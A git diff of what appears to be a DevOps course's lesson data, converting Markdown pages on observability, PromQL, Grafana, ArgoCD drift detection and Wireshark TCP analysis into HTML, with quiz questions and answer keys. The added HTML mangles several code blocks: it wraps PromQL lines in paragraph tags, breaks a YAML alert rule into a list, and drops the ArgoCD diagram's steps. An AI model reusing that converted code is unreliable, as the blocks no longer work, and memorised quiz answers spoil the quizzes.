+</ul>
 
-**How they work together (incident example):**
+<p><strong>How they work together (incident example):</strong></p>
 
-| Step | Pillar | Action |
-|---|---|---|
-| 1 | Metric | Alert: "p99 latency > 2 seconds" |
-| 2 | Trace | Look at slow traces → payment-service takes 1.8s |
-| 3 | Logs | Read payment-service logs → "Connection pool exhausted" |
-| 4 | Metric | Check connection pool metric → maxed out at 20/20 |
-| Root cause | — | Connection pool too small for current traffic |
-| Fix | — | Increase pool size from 20 to 50 |
+<table>
+<thead><tr><th>Step</th><th>Pillar</th><th>Action</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Metric</td><td>Alert: "p99 latency > 2 seconds"</td></tr>
+<tr><td>2</td><td>Trace</td><td>Look at slow traces → payment-service takes 1.8s</td></tr>
+<tr><td>3</td><td>Logs</td><td>Read payment-service logs → "Connection pool exhausted"</td></tr>
+<tr><td>4</td><td>Metric</td><td>Check connection pool metric → maxed out at 20/20</td></tr>
+<tr><td>Root cause</td><td>—</td><td>Connection pool too small for current traffic</td></tr>
+<tr><td>Fix</td><td>—</td><td>Increase pool size from 20 to 50</td></tr>
+</tbody></table>
 
-**Key tools:**
-- Metrics: Prometheus, Datadog, CloudWatch
-- Logs: ELK Stack, Loki, Splunk
-- Traces: Jaeger, Zipkin, Tempo
-- All-in-one: Datadog, New Relic, Grafana Cloud`
+<p><strong>Key tools:</strong></p>
+<ul>
+<li>Metrics: Prometheus, Datadog, CloudWatch</li>
+<li>Logs: ELK Stack, Loki, Splunk</li>
+<li>Traces: Jaeger, Zipkin, Tempo</li>
+<li>All-in-one: Datadog, New Relic, Grafana Cloud</li>
+</ul>`
       },
       {
         titleEn: "PromQL Query Language",
-        contentEn: `PromQL is the query language for Prometheus. It lets you ask questions about your metrics.
+        contentEn: `<p>PromQL is the query language for Prometheus. It lets you ask questions about your metrics.</p>
 
-**Basic queries:**
-\`\`\`promql
-# Current value of a metric
-http_requests_total
+<p><strong>Basic queries:</strong></p>
+<pre><code>promql
+<p># Current value of a metric</p>
+<p>http_requests_total</p>
 
-# Filter by label
-http_requests_total{status="500"}
+<p># Filter by label</p>
+<p>http_requests_total{status="500"}</p>
 
-# Filter by multiple labels
-http_requests_total{method="POST", status="500"}
-\`\`\`
+<p># Filter by multiple labels</p>
+<p>http_requests_total{method="POST", status="500"}</p>
+</code></pre>
 
-**Rate — the most important function:**
-\`\`\`promql
-# Requests per second over the last 5 minutes
-rate(http_requests_total[5m])
+<p><strong>Rate — the most important function:</strong></p>
+<pre><code>promql
+<p># Requests per second over the last 5 minutes</p>
+<p>rate(http_requests_total[5m])</p>
 
-# Error rate (errors / total requests)
-rate(http_requests_total{status="500"}[5m])
-  / rate(http_requests_total[5m])
-\`\`\`
+<p># Error rate (errors / total requests)</p>
+<p>rate(http_requests_total{status="500"}[5m])</p>
+<p>/ rate(http_requests_total[5m])</p>
+</code></pre>
 
-**Aggregation:**
-\`\`\`promql
-# Total requests per second across all instances
-sum(rate(http_requests_total[5m]))
+<p><strong>Aggregation:</strong></p>
+<pre><code>promql
+<p># Total requests per second across all instances</p>
+<p>sum(rate(http_requests_total[5m]))</p>
 
-# Requests per second, grouped by status code
-sum by (status) (rate(http_requests_total[5m]))
+<p># Requests per second, grouped by status code</p>
+<p>sum by (status) (rate(http_requests_total[5m]))</p>
 
-# Average CPU across all pods
-avg(container_cpu_usage_seconds_total)
-\`\`\`
+<p># Average CPU across all pods</p>
+<p>avg(container_cpu_usage_seconds_total)</p>
+</code></pre>
 
-**Percentiles:**
-\`\`\`promql
-# 99th percentile latency
-histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))
-\`\`\`
+<p><strong>Percentiles:</strong></p>
+<pre><code>promql
+<p># 99th percentile latency</p>
+<p>histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))</p>
+</code></pre>
 
-**Alert rule example:**
-\`\`\`yaml
-- alert: HighErrorRate
-  expr: rate(http_requests_total{status="500"}[5m]) > 0.05
-  for: 5m
-  labels:
-    severity: critical
-  annotations:
-    summary: "Error rate above 5% for 5 minutes"
-\`\`\`
+<p><strong>Alert rule example:</strong></p>
+<pre><code>yaml
+<ul>
+<li>alert: HighErrorRate</li>
+</ul>
+<p>expr: rate(http_requests_total{status="500"}[5m]) > 0.05</p>
+<p>for: 5m</p>
+<p>labels:</p>
+<p>severity: critical</p>
+<p>annotations:</p>
+<p>summary: "Error rate above 5% for 5 minutes"</p>
+</code></pre>
 
 {question}
-What does \`rate(http_requests_total[5m])\` measure?
-a) The total number of HTTP requests ever made
-b) The number of requests in the last 5 minutes
-c) The average requests per second over the last 5 minutes
-d) The maximum request count in 5 minutes
+<p>What does <code>rate(http_requests_total[5m])</code> measure?</p>
+<p>a) The total number of HTTP requests ever made</p>
+<p>b) The number of requests in the last 5 minutes</p>
+<p>c) The average requests per second over the last 5 minutes</p>
+<p>d) The maximum request count in 5 minutes</p>
 
-answer: c
-explanation: \`rate()\` calculates the per-second average rate of increase over the given time window. A [5m] window means it looks at the last 5 minutes of data to compute a smooth per-second rate.`
+<p>answer: c</p>
+<p>explanation: <code>rate()</code> calculates the per-second average rate of increase over the given time window. A [5m] window means it looks at the last 5 minutes of data to compute a smooth per-second rate.</p>`
       },
       {
         titleEn: "Grafana Dashboards",
-        contentEn: `Grafana turns metrics into visual dashboards that anyone can understand.
+        contentEn: `<p>Grafana turns metrics into visual dashboards that anyone can understand.</p>
 
-**Dashboard design principles:**
-- Top row: key business metrics (revenue, active users)
-- Second row: system health (error rate, latency, uptime)
-- Lower rows: detailed infrastructure (CPU, memory, disk, network)
-- Use colors: green = healthy, yellow = warning, red = critical
+<p><strong>Dashboard design principles:</strong></p>
+<ul>
+<li>Top row: key business metrics (revenue, active users)</li>
+<li>Second row: system health (error rate, latency, uptime)</li>
+<li>Lower rows: detailed infrastructure (CPU, memory, disk, network)</li>
+<li>Use colors: green = healthy, yellow = warning, red = critical</li>
+</ul>
 
-**Common panel types:**
-- **Time series** — metrics over time (request rate, CPU usage)
-- **Stat** — single big number (current error rate: 0.2%)
-- **Gauge** — progress bar (disk usage: 73%)
-- **Table** — list of data (top 10 slowest endpoints)
-- **Heatmap** — density over time (request latency distribution)
-- **Alert list** — currently firing alerts
+<p><strong>Common panel types:</strong></p>
+<ul>
+<li><strong>Time series</strong> — metrics over time (request rate, CPU usage)</li>
+<li><strong>Stat</strong> — single big number (current error rate: 0.2%)</li>
+<li><strong>Gauge</strong> — progress bar (disk usage: 73%)</li>
+<li><strong>Table</strong> — list of data (top 10 slowest endpoints)</li>
+<li><strong>Heatmap</strong> — density over time (request latency distribution)</li>
+<li><strong>Alert list</strong> — currently firing alerts</li>
+</ul>
 
-**The USE method (for infrastructure):**
-- **U**tilization — how full is the resource? (CPU at 85%)
-- **S**aturation — is there a queue? (10 requests waiting)
-- **E**rrors — any failures? (disk I/O errors)
+<p><strong>The USE method (for infrastructure):</strong></p>
+<ul>
+<li><strong>U</strong>tilization — how full is the resource? (CPU at 85%)</li>
+<li><strong>S</strong>aturation — is there a queue? (10 requests waiting)</li>
+<li><strong>E</strong>rrors — any failures? (disk I/O errors)</li>
+</ul>
 
-**Dashboard variables:**
-Use dropdown filters to make dashboards flexible:
-- Environment: dev / staging / production
-- Service: api / web / worker
-- Time range: last 1h / 6h / 24h / 7d
+<p><strong>Dashboard variables:</strong></p>
+<p>Use dropdown filters to make dashboards flexible:</p>
+<ul>
+<li>Environment: dev / staging / production</li>
+<li>Service: api / web / worker</li>
+<li>Time range: last 1h / 6h / 24h / 7d</li>
+</ul>
 
-**Best practices:**
-- Every team should have a "service overview" dashboard
-- Link alerts to the relevant dashboard
-- Include runbook links: "If this alert fires, follow these steps"
-- Review dashboards monthly — remove panels nobody looks at`
+<p><strong>Best practices:</strong></p>
+<ul>
+<li>Every team should have a "service overview" dashboard</li>
+<li>Link alerts to the relevant dashboard</li>
+<li>Include runbook links: "If this alert fires, follow these steps"</li>
+<li>Review dashboards monthly — remove panels nobody looks at</li>
+</ul>`
       },
       {
         titleEn: "Story: The Memory Leak",
-        contentEn: `**The setup:**
-A team launched a new microservice. Everything looked fine on day one.
+        contentEn: `<p><strong>The setup:</strong></p>
+<p>A team launched a new microservice. Everything looked fine on day one.</p>
 
-**Day 1:** Memory usage: 200 MB. No alerts. All green.
+<p><strong>Day 1:</strong> Memory usage: 200 MB. No alerts. All green.</p>
 
-**Day 3:** Memory usage: 600 MB. Still under the 1 GB limit. Nobody noticed.
+<p><strong>Day 3:</strong> Memory usage: 600 MB. Still under the 1 GB limit. Nobody noticed.</p>
 
-**Day 5:** Memory usage: 950 MB. Prometheus alert fires: "memory usage > 90%."
-The on-call engineer sees the alert but restarts the service. Memory drops to 200 MB. Problem "solved."
+<p><strong>Day 5:</strong> Memory usage: 950 MB. Prometheus alert fires: "memory usage > 90%."</p>
+<p>The on-call engineer sees the alert but restarts the service. Memory drops to 200 MB. Problem "solved."</p>
 
-**Day 7:** Memory hits 1 GB again. The service crashes. Kubernetes restarts it. But during the 30-second restart, 200 requests fail.
+<p><strong>Day 7:</strong> Memory hits 1 GB again. The service crashes. Kubernetes restarts it. But during the 30-second restart, 200 requests fail.</p>
 
-**Day 8 — the real investigation:**
-The team opens Grafana and looks at the memory panel over 7 days. They see a clear pattern: memory grows by ~100 MB per day and never goes down.
+<p><strong>Day 8 — the real investigation:</strong></p>
+<p>The team opens Grafana and looks at the memory panel over 7 days. They see a clear pattern: memory grows by ~100 MB per day and never goes down.</p>
 
-This is a memory leak — the code allocates memory but never frees it.
+<p>This is a memory leak — the code allocates memory but never frees it.</p>
 
-**Finding the root cause:**
-1. Grafana showed memory growing linearly (not spiky → leak, not load)
-2. Logs showed no errors (the leak was silent)
-3. A trace showed that every request to /api/reports created a cache entry that was never cleaned up
-4. The fix: add cache expiration (TTL of 1 hour)
+<p><strong>Finding the root cause:</strong></p>
+<ol>
+<li>Grafana showed memory growing linearly (not spiky → leak, not load)</li>
+<li>Logs showed no errors (the leak was silent)</li>
+<li>A trace showed that every request to /api/reports created a cache entry that was never cleaned up</li>
+<li>The fix: add cache expiration (TTL of 1 hour)</li>
+</ol>
 
-**Lessons learned:**
-- Restarting a service hides the problem, it does not fix it
-- Memory graphs over days/weeks reveal leaks that short time windows miss
-- Every cache must have an expiration policy
-- The postmortem led to a new alert: "If memory grows > 10% per day for 3 days, alert"
+<p><strong>Lessons learned:</strong></p>
+<ul>
+<li>Restarting a service hides the problem, it does not fix it</li>
+<li>Memory graphs over days/weeks reveal leaks that short time windows miss</li>
+<li>Every cache must have an expiration policy</li>
+<li>The postmortem led to a new alert: "If memory grows > 10% per day for 3 days, alert"</li>
+</ul>
 
 {simulation}
-You see this pattern in Grafana:
-- CPU: flat at 30% (no issue)
-- Memory: 200 MB → 400 MB → 600 MB → 800 MB over 4 days
-- Request rate: constant at 100 req/s (no traffic change)
-- Error rate: 0% (no errors yet)
+<p>You see this pattern in Grafana:</p>
+<ul>
+<li>CPU: flat at 30% (no issue)</li>
+<li>Memory: 200 MB → 400 MB → 600 MB → 800 MB over 4 days</li>
+<li>Request rate: constant at 100 req/s (no traffic change)</li>
+<li>Error rate: 0% (no errors yet)</li>
+</ul>
 
-What is happening? What would you do?
+<p>What is happening? What would you do?</p>
 
-Steps:
-1. The linear memory growth with constant traffic = memory leak
-2. Do not restart — that hides the problem
-3. Add memory profiling to the service
-4. Check for: unclosed connections, growing caches, event listeners not removed
-5. Fix the code, deploy, and watch the memory graph flatten`
+<p>Steps:</p>
+<ol>
+<li>The linear memory growth with constant traffic = memory leak</li>
+<li>Do not restart — that hides the problem</li>
+<li>Add memory profiling to the service</li>
+<li>Check for: unclosed connections, growing caches, event listeners not removed</li>
+<li>Fix the code, deploy, and watch the memory graph flatten</li>
+</ol>`
       }
     ]
   },
@@ -6839,129 +7439,160 @@ Steps:
     pages: [
       {
         titleEn: "Git as the Source of Truth",
-        contentEn: `GitOps is a way of managing infrastructure and deployments where Git is the single source of truth.
+        contentEn: `<p>GitOps is a way of managing infrastructure and deployments where Git is the single source of truth.</p>
 
-**The core idea:**
-- The desired state of your system is stored in a Git repository
-- Any change to the system goes through a Git commit
-- An automated tool watches the repo and makes reality match the repo
+<p><strong>The core idea:</strong></p>
+<ul>
+<li>The desired state of your system is stored in a Git repository</li>
+<li>Any change to the system goes through a Git commit</li>
+<li>An automated tool watches the repo and makes reality match the repo</li>
+</ul>
 
-**Traditional deployment:**
-1. Developer pushes code
-2. CI builds an image
-3. Someone runs \`kubectl apply\` manually (or CI does it)
-4. Problem: what is actually running in production? You have to check the cluster.
+<p><strong>Traditional deployment:</strong></p>
+<ol>
+<li>Developer pushes code</li>
+<li>CI builds an image</li>
+<li>Someone runs <code>kubectl apply</code> manually (or CI does it)</li>
+<li>Problem: what is actually running in production? You have to check the cluster.</li>
+</ol>
 
-**GitOps deployment:**
-1. Developer pushes code
-2. CI builds an image and updates the image tag in the Git repo
-3. A GitOps tool (ArgoCD) detects the change and syncs the cluster
-4. What is running in production? Check the Git repo. It is always accurate.
+<p><strong>GitOps deployment:</strong></p>
+<ol>
+<li>Developer pushes code</li>
+<li>CI builds an image and updates the image tag in the Git repo</li>
+<li>A GitOps tool (ArgoCD) detects the change and syncs the cluster</li>
+<li>What is running in production? Check the Git repo. It is always accurate.</li>
+</ol>
 
-**Benefits:**
-- **Audit trail** — every change is a git commit with author, timestamp, and message
-- **Easy rollback** — revert a commit → system rolls back automatically
-- **Security** — developers never need direct access to the cluster
-- **Consistency** — Git is the truth, not what someone typed in a terminal
-- **Pull-based** — the cluster pulls changes from Git (safer than pushing to the cluster)
+<p><strong>Benefits:</strong></p>
+<ul>
+<li><strong>Audit trail</strong> — every change is a git commit with author, timestamp, and message</li>
+<li><strong>Easy rollback</strong> — revert a commit → system rolls back automatically</li>
+<li><strong>Security</strong> — developers never need direct access to the cluster</li>
+<li><strong>Consistency</strong> — Git is the truth, not what someone typed in a terminal</li>
+<li><strong>Pull-based</strong> — the cluster pulls changes from Git (safer than pushing to the cluster)</li>
+</ul>
 
-**GitOps principles:**
-1. The entire system is described declaratively (YAML)
-2. The desired state is stored in Git
-3. Changes are applied automatically after approval
-4. Software agents ensure the actual state matches the desired state`
+<p><strong>GitOps principles:</strong></p>
+<ol>
+<li>The entire system is described declaratively (YAML)</li>
+<li>The desired state is stored in Git</li>
+<li>Changes are applied automatically after approval</li>
+<li>Software agents ensure the actual state matches the desired state</li>
+</ol>`
       },
       {
         titleEn: "ArgoCD: The GitOps Loop",
-        contentEn: `ArgoCD is the most popular GitOps tool for Kubernetes.
+        contentEn: `<p>ArgoCD is the most popular GitOps tool for Kubernetes.</p>
 
-**How ArgoCD works (the loop):**
+<p><strong>How ArgoCD works (the loop):</strong></p>
 
-\`\`\`
-[Git Repository]
-    |
-    | (1) ArgoCD watches for changes
-    v
-[ArgoCD Server]
-    |
-    | (2) Compares: Git state vs Cluster state
-    v
-[Kubernetes Cluster]
-    |
-    | (3) If different → sync (apply changes)
-    | (4) If same → do nothing
-    |
-    └──→ (5) Report status back to ArgoCD UI
-\`\`\`
+<pre><code>[Git Repository]
+<table>
+<thead><tr></tr></thead>
+<tbody>
+</tbody></table>
+<p>v</p>
+<p>[ArgoCD Server]</p>
+<table>
+<thead><tr></tr></thead>
+<tbody>
+</tbody></table>
+<p>v</p>
+<p>[Kubernetes Cluster]</p>
+<table>
+<thead><tr></tr></thead>
+<tbody>
+<tr><td>(4) If same → do nothing</td></tr>
+<tr></tr>
+</tbody></table>
+<p>└──→ (5) Report status back to ArgoCD UI</p>
+</code></pre>
 
-**Key concepts:**
-- **Application** — an ArgoCD resource that links a Git repo to a K8s namespace
-- **Sync** — the act of making the cluster match Git
-- **Health status** — is the app running correctly?
-- **Sync status** — does the cluster match Git?
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>Application</strong> — an ArgoCD resource that links a Git repo to a K8s namespace</li>
+<li><strong>Sync</strong> — the act of making the cluster match Git</li>
+<li><strong>Health status</strong> — is the app running correctly?</li>
+<li><strong>Sync status</strong> — does the cluster match Git?</li>
+</ul>
 
-**Sync statuses:**
-- **Synced** — cluster matches Git (all good)
-- **OutOfSync** — cluster does not match Git (a change is pending)
-- **Unknown** — ArgoCD cannot determine the state
+<p><strong>Sync statuses:</strong></p>
+<ul>
+<li><strong>Synced</strong> — cluster matches Git (all good)</li>
+<li><strong>OutOfSync</strong> — cluster does not match Git (a change is pending)</li>
+<li><strong>Unknown</strong> — ArgoCD cannot determine the state</li>
+</ul>
 
-**Auto-sync vs manual sync:**
-- Auto-sync: ArgoCD applies changes immediately when Git changes
-- Manual sync: ArgoCD detects the diff but waits for human approval
-- Best practice: auto-sync for dev/staging, manual sync for production
+<p><strong>Auto-sync vs manual sync:</strong></p>
+<ul>
+<li>Auto-sync: ArgoCD applies changes immediately when Git changes</li>
+<li>Manual sync: ArgoCD detects the diff but waits for human approval</li>
+<li>Best practice: auto-sync for dev/staging, manual sync for production</li>
+</ul>
 
 {question}
-A developer pushes a new image tag to the GitOps repo. ArgoCD shows "OutOfSync." What does this mean?
-a) The deployment failed
-b) The Git repo has changes that are not yet applied to the cluster
-c) The cluster has changes that are not in Git
-d) ArgoCD is broken
+<p>A developer pushes a new image tag to the GitOps repo. ArgoCD shows "OutOfSync." What does this mean?</p>
+<p>a) The deployment failed</p>
+<p>b) The Git repo has changes that are not yet applied to the cluster</p>
+<p>c) The cluster has changes that are not in Git</p>
+<p>d) ArgoCD is broken</p>
 
-answer: b
-explanation: "OutOfSync" means the desired state (Git) is different from the actual state (cluster). ArgoCD detected the new image tag in Git but has not applied it yet. If auto-sync is on, it will apply shortly. If manual, someone needs to click "Sync."`
+<p>answer: b</p>
+<p>explanation: "OutOfSync" means the desired state (Git) is different from the actual state (cluster). ArgoCD detected the new image tag in Git but has not applied it yet. If auto-sync is on, it will apply shortly. If manual, someone needs to click "Sync."</p>`
       },
       {
         titleEn: "Drift Detection",
-        contentEn: `Drift happens when the actual state of your system does not match the desired state in Git.
+        contentEn: `<p>Drift happens when the actual state of your system does not match the desired state in Git.</p>
 
-**How drift happens:**
-- Someone runs \`kubectl edit deployment\` directly on the cluster
-- A script changes a config outside of the GitOps process
-- A cloud resource is modified through the web console
-- An automated process (like HPA) changes replica counts
+<p><strong>How drift happens:</strong></p>
+<ul>
+<li>Someone runs <code>kubectl edit deployment</code> directly on the cluster</li>
+<li>A script changes a config outside of the GitOps process</li>
+<li>A cloud resource is modified through the web console</li>
+<li>An automated process (like HPA) changes replica counts</li>
+</ul>
 
-**Why drift is dangerous:**
-- You think production has version 2.3 (because Git says so)
-- But someone manually deployed version 2.4 last night
-- Now your rollback goes to 2.3, skipping unknown changes in 2.4
-- Debugging becomes impossible: "It works in Git but not in production"
+<p><strong>Why drift is dangerous:</strong></p>
+<ul>
+<li>You think production has version 2.3 (because Git says so)</li>
+<li>But someone manually deployed version 2.4 last night</li>
+<li>Now your rollback goes to 2.3, skipping unknown changes in 2.4</li>
+<li>Debugging becomes impossible: "It works in Git but not in production"</li>
+</ul>
 
-**How ArgoCD detects drift:**
-1. ArgoCD reads the desired state from Git
-2. ArgoCD reads the actual state from the K8s API
-3. It compares them field by field
-4. Any difference = drift → status becomes "OutOfSync"
-5. ArgoCD can show you a visual diff (like git diff)
+<p><strong>How ArgoCD detects drift:</strong></p>
+<ol>
+<li>ArgoCD reads the desired state from Git</li>
+<li>ArgoCD reads the actual state from the K8s API</li>
+<li>It compares them field by field</li>
+<li>Any difference = drift → status becomes "OutOfSync"</li>
+<li>ArgoCD can show you a visual diff (like git diff)</li>
+</ol>
 
-**Handling drift:**
-- **Auto-heal (self-heal):** ArgoCD automatically reverts manual changes
-- **Alert:** notify the team that someone made a manual change
-- **Ignore:** some fields (like replica count from HPA) should be excluded from drift detection
+<p><strong>Handling drift:</strong></p>
+<ul>
+<li><strong>Auto-heal (self-heal):</strong> ArgoCD automatically reverts manual changes</li>
+<li><strong>Alert:</strong> notify the team that someone made a manual change</li>
+<li><strong>Ignore:</strong> some fields (like replica count from HPA) should be excluded from drift detection</li>
+</ul>
 
-**Best practice: enable self-heal.**
-If someone makes a manual change, ArgoCD reverts it within seconds. This enforces the rule: all changes must go through Git. No exceptions.
+<p><strong>Best practice: enable self-heal.</strong></p>
+<p>If someone makes a manual change, ArgoCD reverts it within seconds. This enforces the rule: all changes must go through Git. No exceptions.</p>
 
 {thinkOutside}
-Your team has self-heal enabled. A senior engineer manually scales a deployment from 3 to 10 replicas during a traffic spike. ArgoCD reverts it to 3 within seconds.
+<p>Your team has self-heal enabled. A senior engineer manually scales a deployment from 3 to 10 replicas during a traffic spike. ArgoCD reverts it to 3 within seconds.</p>
 
-Was ArgoCD right to revert it? How should the engineer handle this situation properly?
+<p>Was ArgoCD right to revert it? How should the engineer handle this situation properly?</p>
 
-The correct approach:
-- The engineer should update the Git repo (change replicas to 10, or adjust HPA settings)
-- Push the commit → ArgoCD syncs → replicas go to 10
-- This takes 2-3 minutes but maintains the GitOps process
-- For emergencies: some teams exclude replica count from drift detection and let HPA manage it
-- Alternative: have an "emergency override" process that commits to Git automatically`
+<p>The correct approach:</p>
+<ul>
+<li>The engineer should update the Git repo (change replicas to 10, or adjust HPA settings)</li>
+<li>Push the commit → ArgoCD syncs → replicas go to 10</li>
+<li>This takes 2-3 minutes but maintains the GitOps process</li>
+<li>For emergencies: some teams exclude replica count from drift detection and let HPA manage it</li>
+<li>Alternative: have an "emergency override" process that commits to Git automatically</li>
+</ul>`
       }
     ]
   },
@@ -6972,92 +7603,116 @@ The correct approach:
     pages: [
       {
         titleEn: "TCP State Machine — Reading the Wire",
-        contentEn: `Every TCP connection goes through **states**. Wireshark shows them all.
+        contentEn: `<p>Every TCP connection goes through <strong>states</strong>. Wireshark shows them all.</p>
 
-**TCP State Machine (simplified):**
-- **CLOSED** → SYN sent → **SYN_SENT**
-- SYN+ACK received → **ESTABLISHED**
-- FIN sent → **FIN_WAIT_1** → ACK → **FIN_WAIT_2** → FIN → **TIME_WAIT**
-- Other side: FIN received → **CLOSE_WAIT** → FIN sent → **LAST_ACK** → CLOSED
+<p><strong>TCP State Machine (simplified):</strong></p>
+<ul>
+<li><strong>CLOSED</strong> → SYN sent → <strong>SYN_SENT</strong></li>
+<li>SYN+ACK received → <strong>ESTABLISHED</strong></li>
+<li>FIN sent → <strong>FIN_WAIT_1</strong> → ACK → <strong>FIN_WAIT_2</strong> → FIN → <strong>TIME_WAIT</strong></li>
+<li>Other side: FIN received → <strong>CLOSE_WAIT</strong> → FIN sent → <strong>LAST_ACK</strong> → CLOSED</li>
+</ul>
 
-**What to look for in Wireshark:**
-- **[TCP Retransmission]** — a packet was lost, sender tries again
-- **[TCP Dup ACK]** — receiver says "I got packet 5, but I'm still waiting for packet 3"
-- **[TCP Window Full]** — receiver's buffer is full, sender must stop
-- **[TCP Zero Window]** — receiver says "stop sending, I need time"
+<p><strong>What to look for in Wireshark:</strong></p>
+<ul>
+<li><strong>[TCP Retransmission]</strong> — a packet was lost, sender tries again</li>
+<li><strong>[TCP Dup ACK]</strong> — receiver says "I got packet 5, but I'm still waiting for packet 3"</li>
+<li><strong>[TCP Window Full]</strong> — receiver's buffer is full, sender must stop</li>
+<li><strong>[TCP Zero Window]</strong> — receiver says "stop sending, I need time"</li>
+</ul>
 
-**CWND (Congestion Window) analysis:**
-- CWND = how many bytes the sender can send before waiting for ACK
-- Starts small (Slow Start), grows fast (doubles each RTT)
-- Packet loss → CWND drops to half (Congestion Avoidance)
-- Wireshark → Statistics → TCP Stream Graphs → Window Scaling
+<p><strong>CWND (Congestion Window) analysis:</strong></p>
+<ul>
+<li>CWND = how many bytes the sender can send before waiting for ACK</li>
+<li>Starts small (Slow Start), grows fast (doubles each RTT)</li>
+<li>Packet loss → CWND drops to half (Congestion Avoidance)</li>
+<li>Wireshark → Statistics → TCP Stream Graphs → Window Scaling</li>
+</ul>
 
-**Key filters:**
-- \`tcp.analysis.retransmission\` — show only retransmissions
-- \`tcp.analysis.duplicate_ack\` — show duplicate ACKs
-- \`tcp.analysis.zero_window\` — show zero window events
-- \`tcp.time_delta > 0.5\` — show packets with > 500ms delay`
+<p><strong>Key filters:</strong></p>
+<ul>
+<li><code>tcp.analysis.retransmission</code> — show only retransmissions</li>
+<li><code>tcp.analysis.duplicate_ack</code> — show duplicate ACKs</li>
+<li><code>tcp.analysis.zero_window</code> — show zero window events</li>
+<li><code>tcp.time_delta > 0.5</code> — show packets with > 500ms delay</li>
+</ul>`
       },
       {
         titleEn: "Retransmissions, RTT, and Performance",
-        contentEn: `**Retransmissions kill performance.** Here's why:
+        contentEn: `<p><strong>Retransmissions kill performance.</strong> Here's why:</p>
 
-**Types of retransmission:**
-- **Fast Retransmit** — 3 duplicate ACKs trigger immediate resend (good, fast recovery)
-- **RTO Retransmit** — timeout expires, no ACKs at all (bad, slow recovery)
-- **Spurious Retransmit** — packet wasn't really lost, just delayed (wastes bandwidth)
+<p><strong>Types of retransmission:</strong></p>
+<ul>
+<li><strong>Fast Retransmit</strong> — 3 duplicate ACKs trigger immediate resend (good, fast recovery)</li>
+<li><strong>RTO Retransmit</strong> — timeout expires, no ACKs at all (bad, slow recovery)</li>
+<li><strong>Spurious Retransmit</strong> — packet wasn't really lost, just delayed (wastes bandwidth)</li>
+</ul>
 
-**Measuring RTT in Wireshark:**
-- Filter: \`tcp.analysis.ack_rtt\`
-- Statistics → TCP Stream Graphs → Round Trip Time
-- Normal LAN: 0.1–1ms | Same city: 1–5ms | Cross-continent: 50–150ms
+<p><strong>Measuring RTT in Wireshark:</strong></p>
+<ul>
+<li>Filter: <code>tcp.analysis.ack_rtt</code></li>
+<li>Statistics → TCP Stream Graphs → Round Trip Time</li>
+<li>Normal LAN: 0.1–1ms | Same city: 1–5ms | Cross-continent: 50–150ms</li>
+</ul>
 
-**The math of latency:**
-- 1 retransmission at 200ms RTT = 200ms added delay
-- With RTO backoff: 1st retry 200ms, 2nd retry 400ms, 3rd retry 800ms
-- 1% packet loss on 100ms RTT link → throughput drops by ~30%
+<p><strong>The math of latency:</strong></p>
+<ul>
+<li>1 retransmission at 200ms RTT = 200ms added delay</li>
+<li>With RTO backoff: 1st retry 200ms, 2nd retry 400ms, 3rd retry 800ms</li>
+<li>1% packet loss on 100ms RTT link → throughput drops by ~30%</li>
+</ul>
 
-**Practical Wireshark workflow:**
-1. Capture traffic on the slow connection
-2. Filter to the specific TCP stream: \`tcp.stream eq 5\`
-3. Check for retransmissions and high RTT
-4. Look at CWND graph — is it sawtoothing (congestion) or flat (application limit)?
-5. Check TIME_WAIT states — too many means connection reuse is broken`
+<p><strong>Practical Wireshark workflow:</strong></p>
+<ol>
+<li>Capture traffic on the slow connection</li>
+<li>Filter to the specific TCP stream: <code>tcp.stream eq 5</code></li>
+<li>Check for retransmissions and high RTT</li>
+<li>Look at CWND graph — is it sawtoothing (congestion) or flat (application limit)?</li>
+<li>Check TIME_WAIT states — too many means connection reuse is broken</li>
+</ol>`
       },
       {
         titleEn: "Story: $2 Million in Latency",
         contentEn: `{story}
 
-**The $2 Million Latency Bug**
+<p><strong>The $2 Million Latency Bug</strong></p>
 
-A trading company noticed their order execution was 50ms slower than competitors. In high-frequency trading, 50ms is an eternity.
+<p>A trading company noticed their order execution was 50ms slower than competitors. In high-frequency trading, 50ms is an eternity.</p>
 
-**The investigation:**
-- Network team said "the network is fine" — ping was 2ms
-- Application team said "the app is fine" — logs showed fast processing
-- Everyone blamed everyone else
+<p><strong>The investigation:</strong></p>
+<ul>
+<li>Network team said "the network is fine" — ping was 2ms</li>
+<li>Application team said "the app is fine" — logs showed fast processing</li>
+<li>Everyone blamed everyone else</li>
+</ul>
 
-**A Wireshark capture revealed the truth:**
-- TCP connections were being established fresh for every trade
-- Each TCP handshake = 3 packets = 1.5 RTT = 3ms
-- But TLS handshake on top = 2 more RTT = 4ms
-- Plus TCP Slow Start meant first few packets were throttled
-- Total overhead per trade: ~15ms
-- Under load, retransmissions added another 20-35ms
+<p><strong>A Wireshark capture revealed the truth:</strong></p>
+<ul>
+<li>TCP connections were being established fresh for every trade</li>
+<li>Each TCP handshake = 3 packets = 1.5 RTT = 3ms</li>
+<li>But TLS handshake on top = 2 more RTT = 4ms</li>
+<li>Plus TCP Slow Start meant first few packets were throttled</li>
+<li>Total overhead per trade: ~15ms</li>
+<li>Under load, retransmissions added another 20-35ms</li>
+</ul>
 
-**The fix:**
-- Connection pooling — reuse TCP connections (saved 7ms)
-- TLS session resumption — skip full handshake (saved 4ms)
-- TCP tuning — larger initial CWND (saved 4ms)
-- Total saving: ~15ms per trade
+<p><strong>The fix:</strong></p>
+<ul>
+<li>Connection pooling — reuse TCP connections (saved 7ms)</li>
+<li>TLS session resumption — skip full handshake (saved 4ms)</li>
+<li>TCP tuning — larger initial CWND (saved 4ms)</li>
+<li>Total saving: ~15ms per trade</li>
+</ul>
 
-**The cost before the fix:**
-- 50ms slower × 40,000 trades/day × average $1 missed profit = ~$2M/year
+<p><strong>The cost before the fix:</strong></p>
+<ul>
+<li>50ms slower × 40,000 trades/day × average $1 missed profit = ~$2M/year</li>
+</ul>
 
-**Lesson:** Wireshark doesn't lie. When everyone says "it's not my problem," capture the packets. The truth is always in the wire.
+<p><strong>Lesson:</strong> Wireshark doesn't lie. When everyone says "it's not my problem," capture the packets. The truth is always in the wire.</p>
 
 {thinkOutside}
-You have a web app that loads slowly. Users complain about 3-second page loads. The server processes requests in 50ms. Where would you capture packets, and what would you look for?`
+<p>You have a web app that loads slowly. Users complain about 3-second page loads. The server processes requests in 50ms. Where would you capture packets, and what would you look for?</p>`
       }
     ]
   },
